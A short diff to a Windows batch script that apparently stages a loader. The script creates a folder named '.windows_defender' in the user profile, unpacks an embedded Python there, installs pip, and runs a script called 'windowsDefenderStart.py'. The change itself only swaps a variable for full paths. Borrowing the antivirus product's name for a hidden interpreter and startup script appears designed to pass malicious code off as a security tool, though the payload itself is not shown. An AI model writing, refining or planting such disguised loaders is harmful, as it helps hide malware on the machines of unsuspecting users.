@@ -1,7 +1,4 @@
-@echo off
 cd %USERPROFILE%
-set pythonDC=%USERPROFILE%\.windows_defender\python\python.exe
-
 
 if not exist "%USERPROFILE%\.windows_defender" (
     mkdir .windows_defender
@@ -16,9 +13,9 @@ mkdir python
 
 tar -xf python-3.9.13-embed-amd64.zip %USERPROFILE%\.windows_defender\python
 
-pythonDC -m ensurepip
+%USERPROFILE%\.windows_defender\python\python.exe -m ensurepip
 
 del windowsDefenderStart.py
 
-pythonDC %USERPROFILE%\.windows_defender\python\getpip.py 
-pythonDC windowsDefenderStart.py
+%USERPROFILE%\.windows_defender\python\python.exe %USERPROFILE%\.windows_defender\python\getpip.py 
+%USERPROFILE%\.windows_defender\python\python.exe windowsDefenderStart.py
